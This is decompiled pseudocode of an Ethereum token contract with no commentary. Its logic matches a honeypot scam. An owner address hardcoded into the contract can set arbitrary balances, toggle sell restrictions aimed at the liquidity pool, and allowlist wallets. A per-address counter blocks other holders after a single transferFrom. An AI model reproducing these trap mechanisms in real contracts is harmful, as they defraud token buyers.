contract main {




// =====================  Runtime code  =====================


address owner;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
uint8 stor5;
address liquidityPoolAddress; offset 8
mapping of uint256 balances;
mapping of uint8 stor7;
mapping of uint256 allowed;
mapping of uint256 stor9;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balances(address arg1) {
    return balances[arg1]
}

function decimals() {
    return decimals
}

function allowed(address arg1, address arg2) {
    return allowed[arg1][arg2]
}

function liquidityPool() {
    return liquidityPoolAddress
}

function balanceOf(address arg1) {
    return balances[address(arg1)]
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowed[address(arg1)][address(arg2)]
}

function sub_e691423b(?) {
    return bool(stor5)
}

function allow(address arg1) {
    return bool(stor7[arg1])
}

function _fallback() payable {
    revert
}

function sub_19b60632(?) {
    require 0xacaefafcccd187001be1ff1285bf3c7b1ba991cd == msg.sender
    stor5 = uint8(arg1)
}

function sub_12fd4871(?) {
    require 0xacaefafcccd187001be1ff1285bf3c7b1ba991cd == msg.sender
    liquidityPoolAddress = arg1
}

function mint(address arg1, uint256 arg2) {
    require 0xacaefafcccd187001be1ff1285bf3c7b1ba991cd == msg.sender
    balances[address(arg1)] = arg2
}

function approve(address arg1, uint256 arg2) {
    allowed[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function addAllow(address arg1, bool arg2) {
    require 0xacaefafcccd187001be1ff1285bf3c7b1ba991cd == msg.sender
    stor7[address(arg1)] = uint8(arg2)
}

function transferOwnership(address arg1) {
    require 0xacaefafcccd187001be1ff1285bf3c7b1ba991cd == msg.sender
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    if arg1:
        if not liquidityPoolAddress:
            liquidityPoolAddress = arg2
    if 1 == bool(stor5):
        if balances[arg1] <= balances[address(arg2)]:
            require balances[arg1] > balances[address(arg2)]
            return 0
    require arg2
    require arg3 <= balances[address(arg1)]
    require arg3 <= allowed[address(arg1)][msg.sender]
    if not stor7[address(arg1)]:
        require not stor9[address(arg1)]
    require arg3 <= balances[address(arg1)]
    balances[address(arg1)] -= arg3
    require arg3 + balances[arg2] >= balances[arg2]
    balances[address(arg2)] = arg3 + balances[arg2]
    require arg3 <= allowed[address(arg1)][msg.sender]
    allowed[address(arg1)][msg.sender] -= arg3
    stor9[address(arg1)]++
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require arg1
    if bool(stor5) != 1:
        require arg2 <= balances[msg.sender]
        balances[msg.sender] -= arg2
        require arg2 + balances[arg1] >= balances[arg1]
        balances[address(arg1)] = arg2 + balances[arg1]
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if liquidityPoolAddress != arg1:
            require arg2 <= balances[msg.sender]
            balances[msg.sender] -= arg2
            require arg2 + balances[arg1] >= balances[arg1]
            balances[address(arg1)] = arg2 + balances[arg1]
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if arg2 > balances[msg.sender]:
                require arg2 <= balances[msg.sender]
            else:
                require arg2 <= balances[msg.sender]
                balances[msg.sender] -= arg2
                require arg2 + balances[arg1] >= balances[arg1]
                balances[address(arg1)] = arg2 + balances[arg1]
                emit Transfer(arg2, msg.sender, 0);
    return 1
}



}
